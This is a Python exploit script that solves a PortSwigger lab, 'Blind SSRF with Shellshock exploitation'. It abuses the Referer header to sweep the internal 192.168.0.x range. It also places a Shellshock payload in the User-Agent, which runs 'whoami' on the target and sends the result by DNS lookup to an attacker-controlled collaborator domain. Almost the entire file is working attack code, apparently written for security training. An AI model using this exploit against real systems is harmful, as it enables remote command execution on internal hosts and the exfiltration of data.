# Blind SSRF with Shellshock exploitation

# https://portswigger.net/web-security/ssrf/blind/lab-shellshock-exploitation

import sys
import requests
import urllib3
import urllib.parse
import re
import time
import warnings
import argparse


warnings.filterwarnings("ignore", category=DeprecationWarning)
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

proxies = {'http': 'http://127.0.0.1:8080', 'https': 'http://127.0.0.1:8080'}

product_path = '/product?productId=1'


##########################################################
#	FUNCTIONS
##########################################################

def send_ssrf(s, url, collab):
	product_url = url + product_path
	user_agent = "() { :; }; /bin/nslookup -v -debug $(whoami)." + collab
	print('[+] User-Agent:\t%s' % user_agent)
	for i in range(1, 256):
		sys.stdout.flush()
		headers = {"Referer": "http://192.168.0." + str(i) + ':8080', "User-Agent": user_agent}
		r = s.get(product_url, headers=headers)
		sys.stdout.write("\r[+] Referer:\thttp://192.168.0.%s:8080" % str(i))
	sys.stdout.flush()
	print("\n[+] You should Poll Now your collaborator and see a DNS request...")
	print("[+] Check the subdomain of the sender and get the result of whoami command...")
	print("[+] Grab it and submit it !")
	

##########################################################
#	MAIN
##########################################################

def main():
	print('[+] Lab: Blind SSRF with Shellshock exploitation')
	parser = argparse.ArgumentParser(description="[+] Lab: Blind SSRF with Shellshock exploitation")
	parser.add_argument('-U',dest='url',required=True, help="Target URL")
	parser.add_argument('-C',dest='collab',required=True, help="Collaborator URL")
	args = parser.parse_args()
	parsed_url = urllib.parse.urlparse(args.url)
	host = parsed_url.netloc
	print(parsed_url)
	url = parsed_url.scheme + '://' + host
	s = requests.Session()
	s.proxies = proxies		# Comment this line to disable proxying
	s.verify = False
	try:
		r = s.get(url, allow_redirects=False)
		time.sleep(1)
		if '<h1>Error</h1>' in r.text or 'Server Error: Gateway Timeout' in r.text:
			print('\n[-] HOST seems to be down <!>')
			sys.exit(-1)
		else:
			# collab = "xxxxxxxxxxxxxxxxxxxx.oastify.com"
			collab = args.collab
			print("\n[+] Sending Blind SSRF via the 'Referer' header and ShellShock attack via 'User-Agent'...")
			send_ssrf(s, url, collab)

	except requests.exceptions.ProxyError:
		print('[-] PROXY seems to be missconfigured <!>')
	except KeyboardInterrupt:
		sys.exit(0)

if __name__ == "__main__":
	main()
